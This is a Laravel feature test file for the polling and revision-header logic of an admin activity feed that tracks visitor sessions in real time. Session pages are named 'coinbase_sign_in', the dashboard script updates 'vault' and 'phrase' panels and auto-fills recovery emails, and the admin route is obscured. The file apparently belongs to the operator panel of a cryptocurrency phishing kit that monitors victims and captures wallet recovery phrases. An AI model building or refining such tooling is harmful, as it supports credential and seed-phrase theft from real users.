<?php

namespace Tests\Feature;

use App\Models\UserEvent;
use App\Models\UserSession;
use Carbon\Carbon;
use Illuminate\Foundation\Http\Middleware\ValidateCsrfToken;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Routing\Middleware\ThrottleRequests;
use Illuminate\Support\Str;
use Tests\TestCase;

class AdminActivityFeedRevisionTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->withoutMiddleware([
            ThrottleRequests::class,
            ValidateCsrfToken::class,
        ]);
    }

    protected function tearDown(): void
    {
        Carbon::setTestNow();
        parent::tearDown();
    }

    public function test_poll_script_204_skips_replace_and_keeps_fill_feed_usd(): void
    {
        $js = file_get_contents(public_path('js/admin-dashboard.js'));
        $this->assertNotFalse($js);

        $start = strpos($js, 'window._startEventPoll = function(token)');
        $this->assertNotFalse($start);
        $end = strpos($js, 'window._evPollWatchdog', $start);
        $this->assertNotFalse($end);
        $block = substr($js, $start, $end - $start);

        $this->assertStringContainsString("r.status === 204", $block);
        $this->assertTrue(strpos($block, "r.status === 204") < strpos($block, 'feed.innerHTML'));
        $this->assertStringContainsString("headers['X-Activity-Rev']", $block);
        $this->assertStringContainsString('_evRenderedToken === token', $block);
        $this->assertStringContainsString('_evRenderedRev', $block);
        $this->assertStringContainsString("getElementById('feed-events-data')", $block);
        $this->assertStringNotContainsString('_evRenderedRevs', $block);
        $this->assertStringNotContainsString('_evRevByToken', $block);
        $this->assertDoesNotMatchRegularExpression('/_evRendered\w*\s*=\s*\{/', $block);

        $two04 = substr($block, strpos($block, "r.status === 204"), 350);
        $this->assertStringContainsString('_evPollLastTick', $two04);
        $this->assertStringContainsString('_fillFeedUsd()', $two04);
        $this->assertStringNotContainsString('updateVaultPanel', $two04);
        $this->assertStringNotContainsString('updatePhrasePanel', $two04);
        $this->assertStringNotContainsString('_autoFillRecoveryEmail', $two04);
        $this->assertStringNotContainsString('innerHTML', $two04);
    }

    public function test_first_events_request_is_200_with_revision_header(): void
    {
        $token = $this->makeSession()->session_token;

        $res = $this->admin()->get('/admin777888xxx/session/'.$token.'/events');

        $res->assertOk();
        $this->assertNotSame('', (string) $res->headers->get('X-Activity-Rev'));
        $res->assertSee('id="feed-events-data"', false);
    }

    public function test_matching_revision_header_returns_204(): void
    {
        $token = $this->makeSession()->session_token;

        $first = $this->admin()->get('/admin777888xxx/session/'.$token.'/events');
        $rev = (string) $first->headers->get('X-Activity-Rev');

        $this->admin()
            ->withHeaders(['X-Activity-Rev' => $rev])
            ->get('/admin777888xxx/session/'.$token.'/events')
            ->assertStatus(204)
            ->assertSee('');
    }

    public function test_request_without_revision_header_always_200(): void
    {
        $token = $this->makeSession()->session_token;

        $this->admin()->get('/admin777888xxx/session/'.$token.'/events')->assertOk();
        $this->admin()->get('/admin777888xxx/session/'.$token.'/events')->assertOk();
    }

    public function test_new_event_invalidates_previous_revision(): void
    {
        $session = $this->makeSession();
        $token = $session->session_token;

        $first = $this->admin()->get('/admin777888xxx/session/'.$token.'/events');
        $oldRev = (string) $first->headers->get('X-Activity-Rev');

        UserEvent::create([
            'session_token' => $token,
            'type' => 'page_visit',
            'page' => 'coinbase_sign_in',
            'element' => '',
            'value' => '',
        ]);

        $second = $this->admin()
            ->withHeaders(['X-Activity-Rev' => $oldRev])
            ->get('/admin777888xxx/session/'.$token.'/events');

        $second->assertOk();
        $this->assertNotSame($oldRev, (string) $second->headers->get('X-Activity-Rev'));
    }

    public function test_other_session_revision_does_not_204(): void
    {
        $a = $this->makeSession()->session_token;
        $b = $this->makeSession()->session_token;

        $revA = (string) $this->admin()->get('/admin777888xxx/session/'.$a.'/events')->headers->get('X-Activity-Rev');

        $this->admin()
            ->withHeaders(['X-Activity-Rev' => $revA])
            ->get('/admin777888xxx/session/'.$b.'/events')
            ->assertOk();
    }

    public function test_activity_summary_change_without_new_event_is_200(): void
    {
        $session = $this->makeSession();
        $token = $session->session_token;

        $oldRev = (string) $this->admin()->get('/admin777888xxx/session/'.$token.'/events')->headers->get('X-Activity-Rev');

        $session->activity_summary = [
            'boxes' => [
                'active' => [
                    'value' => 'Within a day',
                    'source_event_id' => 1,
                    'first_seen_at' => now()->toDateTimeString(),
                    'updated_at' => now()->toDateTimeString(),
                ],
            ],
        ];
        $session->save();

        $second = $this->admin()
            ->withHeaders(['X-Activity-Rev' => $oldRev])
            ->get('/admin777888xxx/session/'.$token.'/events');

        $second->assertOk();
        $this->assertNotSame($oldRev, (string) $second->headers->get('X-Activity-Rev'));
    }

    public function test_live_to_idle_without_new_event_is_200(): void
    {
        Carbon::setTestNow('2026-08-31 10:00:00');
        $session = $this->makeSession();
        $token = $session->session_token;

        $oldRev = (string) $this->admin()->get('/admin777888xxx/session/'.$token.'/events')->headers->get('X-Activity-Rev');

        Carbon::setTestNow('2026-08-31 10:06:00');

        $this->admin()
            ->withHeaders(['X-Activity-Rev' => $oldRev])
            ->get('/admin777888xxx/session/'.$token.'/events')
            ->assertOk();
    }

    public function test_last_seen_move_still_live_does_not_change_revision(): void
    {
        Carbon::setTestNow('2026-08-31 10:00:00');
        $session = $this->makeSession();
        $token = $session->session_token;

        $oldRev = (string) $this->admin()->get('/admin777888xxx/session/'.$token.'/events')->headers->get('X-Activity-Rev');

        $session->last_seen_at = Carbon::parse('2026-08-31 09:59:50');
        $session->save();

        $this->admin()
            ->withHeaders(['X-Activity-Rev' => $oldRev])
            ->get('/admin777888xxx/session/'.$token.'/events')
            ->assertStatus(204);
    }

    public function test_sub_admin_revision_does_not_match_master(): void
    {
        $token = $this->makeSession()->session_token;

        $masterRev = (string) $this->admin()->get('/admin777888xxx/session/'.$token.'/events')->headers->get('X-Activity-Rev');

        $this->withSession(['admin_auth' => true, 'admin_role' => 'sub'])
            ->withHeaders(['X-Activity-Rev' => $masterRev])
            ->get('/admin777888xxx/session/'.$token.'/events')
            ->assertOk();
    }

    public function test_unauthenticated_events_is_not_204(): void
    {
        $token = $this->makeSession()->session_token;

        $this->get('/admin777888xxx/session/'.$token.'/events')
            ->assertRedirect(route('admin.login'));

        $this->withHeaders(['X-Requested-With' => 'XMLHttpRequest', 'Accept' => 'application/json'])
            ->get('/admin777888xxx/session/'.$token.'/events')
            ->assertStatus(401);
    }

    private function admin()
    {
        return $this->withSession(['admin_auth' => true, 'admin_role' => 'master']);
    }

    private function makeSession(): UserSession
    {
        return UserSession::create([
            'session_token' => Str::random(48),
            'ip_address' => '203.0.113.10',
            'user_agent' => 'InspectAgent',
            'current_page' => 'coinbase_sign_in',
            'last_seen_at' => now(),
        ]);
    }
}
